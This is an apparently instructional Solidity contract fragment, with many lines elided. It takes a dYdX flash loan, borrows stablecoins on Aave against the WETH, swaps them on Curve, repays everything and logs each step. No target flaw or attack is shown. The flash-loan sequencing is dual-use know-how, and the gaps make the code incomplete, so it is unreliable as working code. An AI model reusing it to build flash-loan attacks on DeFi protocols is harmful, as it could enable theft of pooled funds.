...
/_/          /____/                                                                  /_/
    ...
    0 Author: Kayaba_Attribution || Juan David Gomez Villalba 
    With Love <3
...
contract dydx is ICallee {
    ...
    function callFunction(address sender, Account.Info memory accountInfo, bytes memory data) external override {
        ...
        console.log("[DyDx] WETH FlashLoan:", WETH.balanceOf(address(this)) / 10**18, "( FLASHLOAN WETH )");
        console.log("[CONTRACT] WETH: ", WETH.balanceOf(address(this)) / 10**18);

        console.log("--- Borrow USDC and USDT from AAVE ---");
        console.log("(essentialy swap our assets to stablecoins without paying Uniswap fees)");
        WETH.approve(address(AaveLendingPool), WETH.balanceOf(address(this)));
        console.log("[AAVE] Approve lending pool to use our WETH");
        ...
        console.log("[AAVE] Deposit all WETH - 2 wei:");
        console.log("[CONTRACT] WETH ( in wei ):", WETH.balanceOf(address(this)));
        console.log("[CONTRACT] aWETH ( in ether ):", aWETH.balanceOf(address(this)) / 10**18);

        uint inital_aWETH_balance = aWETH.balanceOf(address(this));

        console.log("We can borrow up to 80% of the collateral");
        console.log("[AAVE] Borrow USDT with 4/10 of the WETH...");
        ...
        (
            ...
            0,
            address(this));
        console.log("[CONTRACT] USDT: ", USDT.balanceOf(address(this)) / 10**6);

        console.log("[AAVE] Borrow USDC with 4/10 of the WETH...");
        // Borrow USDC
        AaveLendingPool.borrow
        (
            address(USDC),
            ...
            0,
            address(this));
        console.log("[CONTRACT] USDC: ", USDC.balanceOf(address(this)) / 10**6);
        ...
        console.log("[AAVE] Deposit USDC and get aUSDC");
        ...
        console.log("[CONTRACT] USDC: ", USDC.balanceOf(address(this)) / 10**6);
        console.log("[CONTRACT] aUSDC: ", aUSDC.balanceOf(address(this)) / 10**6);

        AaveLendingPool.withdraw(address(USDC), aUSDC.balanceOf(address(this)), address(this));
        console.log("[AAVE] Withdraw all aUSDC: ");
        console.log("[CONTRACT] aUSDC: ", aUSDC.balanceOf(address(this)) / 10**6);
        console.log("[CONTRACT] USDC: ", USDC.balanceOf(address(this)) / 10**6);

        console.log("########### AAVE END ############");
        ...
        console.log("[CURVE] Approve USDT");
        console.log("[CURVE] Approve USDC");
        console.log("[CONTRACT] USDT:", USDT.balanceOf(address(this)) / 10**6);
        console.log("[CONTRACT] USDC:", USDC.balanceOf(address(this)) / 10**6);

        console.log("[CURVE] Swap USDT to USDC");
        ...
        console.log("[CONTRACT] USDT:", USDT.balanceOf(address(this)) / 10**6);
        console.log("[CONTRACT] USDC:", USDC.balanceOf(address(this)) / 10**6);
        console.log("[CURVE] Swap USDC to USDT");
        ...
        console.log("---- Repay USDC and USDT loans ----");

        USDT.safeApprove(address(AaveLendingPool), uint(type(uint256).max));
        USDC.approve(address(AaveLendingPool), USDC.balanceOf(address(this)));

        console.log("[AAVE] Approve USDT");
        console.log("[AAVE] Approve USDC");

        // Repay the USDC and USDT loans
        console.log("[AAVE] Repay the USDC and USDT");
        ...
        console.log("[CONTRACT] USDC ( after payment ): ", USDC.balanceOf(address(this)) / 10**6);
        console.log("[CONTRACT] USDT ( after payment ): ", USDT.balanceOf(address(this)) / 10**6);

        // Swap our aWETH to WETH
        AaveLendingPool.withdraw(address(WETH), aWETH.balanceOf(address(this)), address(this));
        console.log("[AAVE] Withdraw all aWETH: ", aWETH.balanceOf(address(this)) / 10**18, "aWETH");
        console.log("[CONTRACT] aWETH: ", aWETH.balanceOf(address(this)) / 10**18);
        console.log("[CONTRACT] WETH: ", WETH.balanceOf(address(this)) / 10**18);

        require(WETH.balanceOf(address(this)) > loanAmount + 2, "CANNOT REPAY LOAN");
        console.log("DyDx Loan Paid !!!");
